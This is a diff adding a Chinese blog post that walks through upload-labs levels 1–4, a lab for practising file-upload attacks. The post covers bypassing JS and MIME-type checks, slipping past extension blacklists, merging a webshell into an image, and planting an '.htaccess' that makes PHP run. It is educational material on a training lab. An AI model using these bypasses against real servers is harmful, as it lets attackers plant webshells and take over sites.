@@ -213,6 +213,636 @@
             
 
   
+    <article id="post-文件上传" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+  
+  
+    <h1 itemprop="name">
+	
+	  <a class="article-title" href="/2020/04/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" target="_blank">文件上传</a>
+  
+    </h1>
+  
+
+
+  
+  
+<a href="/2020/04/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="archive-article-date">
+        <time datetime="2020-04-07T03:02:57.095Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-07</time>
+</a>
+
+  
+  
+    
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h4 id="介绍文件上传漏洞"><a href="#介绍文件上传漏洞" class="headerlink" title="介绍文件上传漏洞"></a>介绍文件上传漏洞</h4><p>现在web应用程序，上传文件一种常见功能，为了提高效率，允许用户上传图片，视频，头像和许多其他的文件。然而向用户提供的功能越多，web应用受到攻击的风险就越大，如果web应用存在文件上传漏洞，那么恶意用户就可以利用文件上传漏洞将可执行脚本程序上传到服务器中，获得网站权限，或者进一步危害服务器</p>
+<h5 id="1、为什么文件上传存在漏洞"><a href="#1、为什么文件上传存在漏洞" class="headerlink" title="1、为什么文件上传存在漏洞"></a>1、为什么文件上传存在漏洞</h5><p>上传文件时，如果服务器代码没有对客户端上传的文件进行严格的验证和过滤，就容易造成可以上传任意文件的情况，包括上传脚本文件(asp、aspx、php、jsp等格式文件)</p>
+<h5 id="2、危害"><a href="#2、危害" class="headerlink" title="2、危害"></a>2、危害</h5><p>非法用户利用文件上传的恶意脚本控制整个网站，甚至控制服务器，这个恶意脚本文件被称为WebShell，也可以称之为”网页后门”，WebShell具有强大功能，比如查看服务器目录，服务器中的文件，执行系统命令等。</p>
+<h4 id="文件上传导致的常见安全问题"><a href="#文件上传导致的常见安全问题" class="headerlink" title="文件上传导致的常见安全问题"></a>文件上传导致的常见安全问题</h4><ul>
+<li>上传文件是Web脚本语言，服务器的web容器解释并执行了用户上传的脚本，导致代码执行。</li>
+<li>上传文件时Flash的策略文件crossdomain.xml，黑客用以控制Flash在该域下的行为；</li>
+<li>上传文件时病毒、木马文件、黑客用以诱骗用户或者管理者下载执行。</li>
+<li>上传文件是钓鱼图片或为包含了脚本的图片，在某些版本中的浏览器会被作为脚本执行，被用于钓鱼和欺诈</li>
+</ul>
+<h5 id="文件上传漏洞一般是指WebShell能被服务器解析的问题，要完成这个攻击要有几个条件"><a href="#文件上传漏洞一般是指WebShell能被服务器解析的问题，要完成这个攻击要有几个条件" class="headerlink" title="文件上传漏洞一般是指WebShell能被服务器解析的问题，要完成这个攻击要有几个条件"></a>文件上传漏洞一般是指WebShell能被服务器解析的问题，要完成这个攻击要有几个条件</h5><p>1、上传的文件能被web容器解析并执行，所以文件上传后所在的目录是要在web容器所覆盖的路径</p>
+<p>2、用户能够从web上访问这个文件。如果文件上传了，但用户无法通过web访问，或者无法让web容器解析这个脚本，那么也不能称之为漏洞</p>
+<p>3、用户上传的文件若被安全检查、格式化、图片压缩等功能改变了内容，则也可能导致攻击不成功</p>
+<h4 id="绕过JS检测验证"><a href="#绕过JS检测验证" class="headerlink" title="绕过JS检测验证"></a>绕过JS检测验证</h4><p>upload-labs第一关</p>
+<p>JS检测绕过上传漏洞常见于用户选择文件上传的场景，如果上传文件的后缀不被允许，则会弹窗告知，此时上传文件的数据包并没有发送到服务器端，只是在客户端浏览器使用JavaScript对数据包进行检测。</p>
+<p>例如：</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585621194490.png" alt="image-20200404172039951"></p>
+<p>有两种方法可以绕过客户端JavaScript的检测</p>
+<p>1）使用浏览器的插件，删除检测文件后缀的JS代码，然后上传文件即可绕过。</p>
+<p>2）先把上传文件的后缀名改为允许上传的，比如：jpg、png、gif等，绕过JS检测，在用BurpSuite抓包，将原本的jpg文件改回php文件</p>
+<p>例如：</p>
+<p>先将php文件改为jpg可上传格式</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585621081483.png" alt="image-20200404173421639"></p>
+<p>进行文件上传，使用Burp抓包</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585620437425.png" alt="image-20200404173538313"></p>
+<p>更改完查看页面，返回空白</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585621692421.png" alt="image-20200404173601481"></p>
+<p>查看文件夹下是否已经上传了，已经上传，这时候就可以用菜刀或者蚁剑连接了</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585621575732.png" alt="image-20200404173701730"></p>
+<h5 id="JS验证代码分析"><a href="#JS验证代码分析" class="headerlink" title="JS验证代码分析"></a>JS验证代码分析</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 检测文件后缀名的函数</span><br><span class="line">function checkFile() &#123;</span><br><span class="line">&#x2F;&#x2F; 定义变量file，file的值是通过document对象调用getElementsByName，通过Name属性当中的值，来获取当前的标签数组，当前代码中只有upload_file这一个Name属性值，第0个也就是第一个元素的值，也就是文件安全名称</span><br><span class="line">    var file &#x3D; document.getElementsByName(&#39;upload_file&#39;)[0].value;</span><br><span class="line">&#x2F;&#x2F; 如果当前文件上传的全名称为Null和空，表示没有上传文件</span><br><span class="line">    if (file &#x3D;&#x3D; null || file &#x3D;&#x3D; &quot;&quot;) &#123;</span><br><span class="line">&#x2F;&#x2F; 弹出对话框表示要选择一个上传的文件</span><br><span class="line">        alert(&quot;请选择要上传的文件!&quot;);</span><br><span class="line">&#x2F;&#x2F; 并且结束函数返回false</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;定义允许上传的文件类型</span><br><span class="line">    var allow_ext &#x3D; &quot;.jpg|.png|.gif&quot;;</span><br><span class="line">    &#x2F;&#x2F;提取上传文件的类型</span><br><span class="line">    &#x2F;&#x2F; lastIndexOf是从最点&quot;.&quot;  开始所以后面的字符，判断是否是允许上传的文件类型</span><br><span class="line">    var ext_name &#x3D; file.substring(file.lastIndexOf(&quot;.&quot;));</span><br><span class="line">    &#x2F;&#x2F;判断上传文件类型是否允许上传</span><br><span class="line">    if (allow_ext.indexOf(ext_name + &quot;|&quot;) &#x3D;&#x3D; -1) &#123;</span><br><span class="line">        var errMsg &#x3D; &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="Burp-Suite剔除响应JS"><a href="#Burp-Suite剔除响应JS" class="headerlink" title="Burp Suite剔除响应JS"></a>Burp Suite剔除响应JS</h5><p>对于JS前端验证，直接删除JS代码可以绕过JS验证</p>
+<p>在Proxy中的Options模块中找到Rseponse Modification中的Remove all JavaScript选中</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585620672218.png" alt="1585620437425"></p>
+<p>设置代理，先尝试上传JPG文件，JPG文件上传成功</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585622021463.png" alt="1585620672218"></p>
+<p>上传php文件，显示当前为.php并不是jpg不允许上传</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585622110789.png" alt="1585621081483"></p>
+<p>查看源代码，发现会使用checkFile()函数进行检查文件，如果文件不是jpg不允许上传</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585622231022.png" alt="1585621194490"></p>
+<p>设置打开burp抓包，进行自动删除JavaScript，将网页代理打开后刷新一下页面，查看源代码</p>
+<p>发现已经没有了checkFile()函数，</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585622199515.png" alt="1585621575732"></p>
+<p>再次进行上传php，返回空白</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585621649374.png" alt="1585621649374"></p>
+<p>查看upload文件夹是否有des.php，成功上传文件</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200404172039951.png" alt="1585621692421"></p>
+<h5 id="浏览器审计工具剔除JS"><a href="#浏览器审计工具剔除JS" class="headerlink" title="浏览器审计工具剔除JS"></a>浏览器审计工具剔除JS</h5><p>利用浏览器的审查工具剔除JS之后，保存为新文件然后进行文件上传</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585628622895.png" alt="1585622021463"></p>
+<p>直接将以上onsubmit删除</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585628668783.png" alt="1585622110789"></p>
+<p>上传php文件，返回空白，表示上传成功</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585628738114.png" alt="1585622199515"></p>
+<p>查看upload文件</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200404173421639.png" alt="1585622231022"></p>
+<h5 id="使用中国菜刀或者蚁剑连接"><a href="#使用中国菜刀或者蚁剑连接" class="headerlink" title="使用中国菜刀或者蚁剑连接"></a>使用中国菜刀或者蚁剑连接</h5><p>将webshell文件的路径写上</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585642655532.png" alt="1585628622895"></p>
+<p>连接密码admin</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585642675381.png" alt="1585628668783"></p>
+<p>连接之后就可以控制里面的文件</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585642768435.png" alt="1585628738114"></p>
+<h4 id="绕过MIME-Type验证"><a href="#绕过MIME-Type验证" class="headerlink" title="绕过MIME-Type验证"></a>绕过MIME-Type验证</h4><p>upload-labs第二关</p>
+<h5 id="MIME-Type介绍"><a href="#MIME-Type介绍" class="headerlink" title="MIME-Type介绍"></a>MIME-Type介绍</h5><p><em>MIME</em>(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型，是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式</p>
+<h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>在客户端上传文件时，通过Burp Suite抓取数据包，当上传一个php格式的文件时，可以看到数据包中的 Content-Type的值是application/octet-stream，而上传jpg格式的文件时，数据包中的Content-Type的值是image/jpeg</p>
+<p>例如：</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585642717537.png" alt="image-20200404180024578"></p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585642831421.png" alt="image-20200404180118148"></p>
+<p>如果服务器代码使用过Content-Type的值来判断文件的类型，那么就存在被绕过的可能，因为Content-Type的值使用过客户端传递的，是可以任意修改的，所以当传一个php文件的时候，在Burp Suite中将Content-Type修改为image/jpeg就可以绕过服务端的检测</p>
+<h5 id="注意：是通过客户端传递，服务端检测，是服务端检测"><a href="#注意：是通过客户端传递，服务端检测，是服务端检测" class="headerlink" title="注意：是通过客户端传递，服务端检测，是服务端检测"></a>注意：是通过客户端传递，服务端检测，是服务端检测</h5><h5 id="验证MIME-Type代码分析"><a href="#验证MIME-Type代码分析" class="headerlink" title="验证MIME-Type代码分析"></a>验证MIME-Type代码分析</h5><p>MIME-Type验证并不是发生在客户端验证，而是发生在服务端验证</p>
+<p>// $_FILES表示使用了$_FILES全局数组，主要作用就是进行文件操作，例如文件上传时，使用较多<br>// upload_file是我们上传时的文件，也就是表单当中input-type=file对应有一个name，name属性的值用来接收$_FILES[‘upload_file’]这个文件，来调用第二维可以指定对应的type，来获取上传文件的MIME-Type类型</p>
+<p>查看源码分析，使用$_FILE[‘uploda_file’] [‘type’]获取上传文件的MIME-Type类型，其中upload_file是在表中定义的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line">if (isset($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">&#x2F;&#x2F; 判断文件类型，只有符合image&#x2F;jpeg或者image&#x2F;png才能成功成功上传</span><br><span class="line">        if (($_FILES[&#39;upload_file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;jpeg&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;png&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;gif&#39;)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123;</span><br><span class="line">                $img_path &#x3D; $UPLOAD_ADDR . $_FILES[&#39;upload_file&#39;][&#39;name&#39;];</span><br><span class="line">                $is_upload &#x3D; true;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">      &#x2F;&#x2F;当文件类型不是上面判断的类型就会报错</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg &#x3D; &#39;文件类型不正确，请重新上传！&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; $UPLOAD_ADDR.&#39;文件夹不存在,请手工创建！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="Burp-Suite绕过MIME-Type验证"><a href="#Burp-Suite绕过MIME-Type验证" class="headerlink" title="Burp Suite绕过MIME-Type验证"></a>Burp Suite绕过MIME-Type验证</h5><p>初始页面</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585642806844.png" alt="1585642655532"></p>
+<p>上传正常图片，成功上传</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200404173601481.png" alt="1585642675381"></p>
+<p>上传php文件，返回类型不正确</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585642880004.png" alt="1585642717537"></p>
+<p>使用burp抓包修改MIME-Type，</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585658299132.png" alt="1585642768435"></p>
+<p>将红线处改为image/jpeg</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585658340468.png" alt="1585642806844"></p>
+<p>放行网址，页面返回空白说明成功</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585658484673.png" alt="1585642831421"></p>
+<p>查看文件夹，成功导入</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585658367062.png" alt="1585642880004"></p>
+<p>可以进行菜刀连接</p>
+<h5 id="PHP中还存在一种相似的文件上传漏洞，PHP函数getimagesize-可以获取图片的宽、高等信息，如果上传的不是图片文件，那么getimagesize-就获取不到信息，则不允许上传。"><a href="#PHP中还存在一种相似的文件上传漏洞，PHP函数getimagesize-可以获取图片的宽、高等信息，如果上传的不是图片文件，那么getimagesize-就获取不到信息，则不允许上传。" class="headerlink" title="PHP中还存在一种相似的文件上传漏洞，PHP函数getimagesize()可以获取图片的宽、高等信息，如果上传的不是图片文件，那么getimagesize()就获取不到信息，则不允许上传。"></a>PHP中还存在一种相似的文件上传漏洞，PHP函数getimagesize()可以获取图片的宽、高等信息，如果上传的不是图片文件，那么getimagesize()就获取不到信息，则不允许上传。</h5><h5 id="但是可以将一个图片和WebShell合并为一个文件。例如使用一下命令"><a href="#但是可以将一个图片和WebShell合并为一个文件。例如使用一下命令" class="headerlink" title="但是可以将一个图片和WebShell合并为一个文件。例如使用一下命令"></a>但是可以将一个图片和WebShell合并为一个文件。例如使用一下命令</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat image.png wbeshell.php &gt; image.php</span><br></pre></td></tr></table></figure>
+
+<h5 id="此时使用getimagesize-就可以获取图片信息，且WebShell的后缀是php，也能被Apache解析为脚本文件，通过这种方式就可以绕过getimagesize-的限制。"><a href="#此时使用getimagesize-就可以获取图片信息，且WebShell的后缀是php，也能被Apache解析为脚本文件，通过这种方式就可以绕过getimagesize-的限制。" class="headerlink" title="此时使用getimagesize()就可以获取图片信息，且WebShell的后缀是php，也能被Apache解析为脚本文件，通过这种方式就可以绕过getimagesize()的限制。"></a>此时使用getimagesize()就可以获取图片信息，且WebShell的后缀是php，也能被Apache解析为脚本文件，通过这种方式就可以绕过getimagesize()的限制。</h5><h4 id="绕过黑名单验证"><a href="#绕过黑名单验证" class="headerlink" title="绕过黑名单验证"></a>绕过黑名单验证</h4><p>upload-labs第三关</p>
+<h5 id="基于文件后缀名验证介绍"><a href="#基于文件后缀名验证介绍" class="headerlink" title="基于文件后缀名验证介绍"></a>基于文件后缀名验证介绍</h5><p>对于文件上传模块来说，尽量避免上传可执行的脚本文件。为了防止上传脚本需要设置对应的验证方式。最简单的就是设置文件后缀名验证</p>
+<p>基于文件后缀名验证方式的分类：</p>
+<p>1、机遇白名单验证：只针对白名单中有的后缀名，文件才能上传成功。</p>
+<p>2、基于黑名单验证：只针对黑名单中没有的后缀名，文件才能上传成功</p>
+<h5 id="基于黑名单验证代码分析"><a href="#基于黑名单验证代码分析" class="headerlink" title="基于黑名单验证代码分析"></a>基于黑名单验证代码分析</h5><p>对于黑名单中的后缀名筛选。绕过黑名单可以通过寻找”漏网之鱼”，寻找某些可以被作为脚本执行同行也不再黑名单中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">    &#x2F;&#x2F; 设置了四个黑名单后缀名</span><br><span class="line">        $deny_ext &#x3D; array(&#39;.asp&#39;,&#39;.aspx&#39;,&#39;.php&#39;,&#39;.jsp&#39;);</span><br><span class="line">    &#x2F;&#x2F; 接收当前上传的文件名</span><br><span class="line">        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);</span><br><span class="line">    &#x2F;&#x2F; 接收之后进行并处理</span><br><span class="line">        $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点</span><br><span class="line">        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;);</span><br><span class="line">        $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写</span><br><span class="line">        $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA</span><br><span class="line">        $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;收尾去空</span><br><span class="line">	&#x2F;&#x2F; 进行判断，如果文件名不在$deny_ext这个黑名单当中，进行上传。</span><br><span class="line">        if(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">    &#x2F;&#x2F; 上传之后重命名，命名成跟时间以及随机数相关的内容，这样他就不是原名称，而是全新的名称</span><br><span class="line">            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR. &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123;</span><br><span class="line">                 $img_path &#x3D; $UPLOAD_ADDR .&#39;&#x2F;&#39;. $_FILES[&#39;upload_file&#39;][&#39;name&#39;];</span><br><span class="line">                 $is_upload &#x3D; true;</span><br><span class="line">            &#125;</span><br><span class="line">    	&#x2F;&#x2F; 如果在黑名单当值，执行else，不允许上传</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg &#x3D; &#39;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="BurpSuite绕过黑名单验证"><a href="#BurpSuite绕过黑名单验证" class="headerlink" title="BurpSuite绕过黑名单验证"></a>BurpSuite绕过黑名单验证</h5><p>利用BurpSuite工具截断HTTP请求，利用intruder模块进行枚举后缀名，寻找黑名单中没有过滤的后缀名</p>
+<p>使用burpsuite抓包，发送到intruder模块，将高亮处进行clear$</p>
+<p>将.php进行Add$</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585658427020.png" alt="1585658299132"></p>
+<p>在Payloads子模块中放入准备好的字典</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585658598287.png" alt="1585658340468"></p>
+<p>点击Start attack进行攻击</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585658574272.png" alt="1585658367062"></p>
+<p>空白和php的length相同，说明php结尾的会被过滤，使用其他三种结尾</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585719740191.png" alt="1585658427020"></p>
+<p>右键选择Show response in browser，copy他的连接</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200404173538313.png" alt="1585658484673"></p>
+<p>页面打开连接并复制图片地址</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585712340513.png" alt="1585658574272"></p>
+<p>将复制的地址在网址中打开，成功返回一句话木马</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585720215008.png" alt="1585658598287"></p>
+<h5 id="上传Webshell菜刀连接"><a href="#上传Webshell菜刀连接" class="headerlink" title="上传Webshell菜刀连接"></a>上传Webshell菜刀连接</h5><h4 id="绕过黑名单验证-htaccess"><a href="#绕过黑名单验证-htaccess" class="headerlink" title="绕过黑名单验证(.htaccess)"></a>绕过黑名单验证(.htaccess)</h4><p>upload-labs第四关</p>
+<h5 id="htaccess文件介绍"><a href="#htaccess文件介绍" class="headerlink" title=".htaccess文件介绍"></a>.htaccess文件介绍</h5><p>htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能</p>
+<p>其中.htaccess文件内容：</p>
+<p>SetHandler application/x-httpd-php</p>
+<p>设置当前目录所有文件都是用PHP解析，那么无论上传任何文件，只要文件内容符合PHP语言代码规范，就会被当做PHP执行。不符合则报错</p>
+<h5 id="配置文件http-conf"><a href="#配置文件http-conf" class="headerlink" title="配置文件http.conf"></a>配置文件http.conf</h5><p>在Apache中如果需要启动.htaccess，必须在http.conf中设置 AllowOverride</p>
+<p>默认情况下红框内会出现None，将None修改为All</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585719758584.png" alt="1585712340513"></p>
+<h5 id="审计黑名单过滤代码"><a href="#审计黑名单过滤代码" class="headerlink" title="审计黑名单过滤代码"></a>审计黑名单过滤代码</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">    &#x2F;&#x2F; 以下为黑名单，不允许的扩展名，对上传进行判定，判定如果在黑名单中，执行下面else，文件不允许上传</span><br><span class="line">        $deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;);</span><br><span class="line">        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);</span><br><span class="line">        $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点</span><br><span class="line">        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;);</span><br><span class="line">        $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写</span><br><span class="line">        $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA</span><br><span class="line">        $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;收尾去空</span><br><span class="line"></span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123;</span><br><span class="line">                $img_path &#x3D; $UPLOAD_ADDR . $_FILES[&#39;upload_file&#39;][&#39;name&#39;];</span><br><span class="line">                $is_upload &#x3D; true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg &#x3D; &#39;此文件不允许上传!&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在黑名单中，没有对.htaccess进行过滤，可以直接上传.htaccess来这是使用php解析任意文件。</p>
+<p>文件内容：SetHandler application/x-httpd-php</p>
+<h5 id="制作图片phpinfo探针并上传"><a href="#制作图片phpinfo探针并上传" class="headerlink" title="制作图片phpinfo探针并上传"></a>制作图片phpinfo探针并上传</h5><p>将SetHandler application/x-httpd-php复制到文本另存为.htaccess</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585719831410.png" alt="1585719740191"></p>
+<p>页面进行上传，会返回一个空图片</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585720364221.png" alt="1585719758584"></p>
+<p>复制图片链接，打开新的网址，会出现403，会显示</p>
+<p>You don’t have permission to access /upload-labs/upload/.htaccess<br>on this server.</p>
+<p>这说明你文件已经上传了，但是你没有权限去访问他</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585720385618.png" alt="1585719831410"></p>
+<p>在上传一个图片，图片包含phpinfo探针</p>
+<p>使用文本编写php代码</p>
+<?php 
+
+​    phpinfo();
+
+?>
+
+<p>保存为1.jpg进行上传</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585752615261.png" alt="1585720215008"></p>
